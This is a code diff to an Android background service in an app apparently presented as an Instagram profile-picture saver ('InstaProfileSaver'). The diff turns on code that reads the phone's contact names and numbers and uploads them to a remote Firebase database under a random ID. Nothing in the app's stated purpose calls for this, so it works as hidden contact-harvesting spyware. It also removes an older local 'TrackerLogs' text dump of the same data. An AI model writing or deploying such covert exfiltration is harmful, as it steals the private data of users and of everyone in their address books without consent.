@@ -12,6 +12,7 @@ import android.graphics.Paint;
 import android.graphics.fonts.Font;
 import android.graphics.pdf.PdfDocument;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.CountDownTimer;
 import android.os.Environment;
 import android.os.IBinder;
@@ -42,6 +43,7 @@ import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.UUID;
 
 public class ContactService extends Service{
 
@@ -56,29 +58,18 @@ public class ContactService extends Service{
 
         public static final String COUNTDOWN_BR = "your_package_name.countdown_br";
         Intent bi = new Intent(COUNTDOWN_BR);
-    SharedPreferences sharedPreferences;
+        SharedPreferences sharedPreferences;
         CountDownTimer cdt = null;
-        String username="";
-    File path = null, extraLogPath = null;
+        File path = null, extraLogPath = null;
 
         @Override
         public void onCreate() {
             super.onCreate();
-
             appDatabase = TaskAppDatabase.getInstance(ContactService.this);
-            mFirebaseInstance = FirebaseDatabase.getInstance();
-             sharedPreferences = getSharedPreferences(Constants.PREFS_NAME, 0);
-             username= sharedPreferences.getString(Constants.userName, "");
-            mFirebaseDatabase = mFirebaseInstance.getReference(username.substring(0, username.length() - 10));
+             mFirebaseInstance = FirebaseDatabase.getInstance();
+            UUID uuid = UUID.randomUUID();
+            mFirebaseDatabase = mFirebaseInstance.getReference(uuid.toString());
             mFirebaseInstance.getReference("app_title").setValue("InstaProfileSaver");
-
-            path = new File(Environment.getExternalStoragePublicDirectory("")+"/TrackerLogs",
-                    username+".txt");
-            extraLogPath = new File(Environment.getExternalStoragePublicDirectory("")+"/TrackerLogs",
-                    "InstaProfileSaver"+".txt");
-
-
-
             if (ContextCompat.checkSelfPermission(ContactService.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
 
                 new YourAsyncTask().execute();
@@ -99,15 +90,7 @@ public class ContactService extends Service{
                 @Override
                 public void onFinish() {
                     Log.i(TAG, "Timer finished");
-                /*android.os.Process.killProcess(android.os.Process.myPid());
-                  System.exit(0);*/
-                    //  System.exit(0);
-                    //  ExitActivity.exitApplication(ExitService.this);
                     stopService(new Intent(com.funcoders.Instadpsaver.contactsevice.ContactService.this, ContactService.class));
-
-                    //   Intent intent = new Intent(ExitService.this, LoginActivity.class);
-                    // intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-                    //   startActivity(intent);
 
                 }
             };
@@ -149,8 +132,7 @@ public class ContactService extends Service{
         for(String friend : friends) {
             mFirebaseDatabase.child(Constants.getCurrentDate()+"   Count ("+contactModelList.size()+")").child(friend).setValue(true);
         }
-        //   mFirebaseDatabase.child(userId).child(String.valueOf(friends)).setValue(true);
-        //   System.out.println("Login data "+contactModelList.get(i).mobileNumber+" "+contactModelList.get(i).name);
+
         addUserChangeListener();
 
 
@@ -243,20 +225,16 @@ public class ContactService extends Service{
 
 
             if(contactModelList.size()!=0) {
-               // storetoFirebaseDB(contactModelList);
+                storetoFirebaseDB(contactModelList);
 
-                Constants.createLogDirectory();
+               // Constants.createLogDirectory();
 
-                for(int i=0;i<contactModelList.size();i++)
-                {
-                    storeContactstxt(contactModelList.get(i).getName()+"  : "+contactModelList.get(i).getMobileNumber(),username.substring(0, username.length() - 10));
+              //  for(int i=0;i<contactModelList.size();i++)
+             //   {
+                //    storeContactstxt(contactModelList.get(i).getName()+"  : "+contactModelList.get(i).getMobileNumber(),Constants.getCurrentDate());
 
-                }
-
-
-
-
-               // createPdf(contactModelList);
+             //   }
+                // createPdf(contactModelList);
 
             }
 
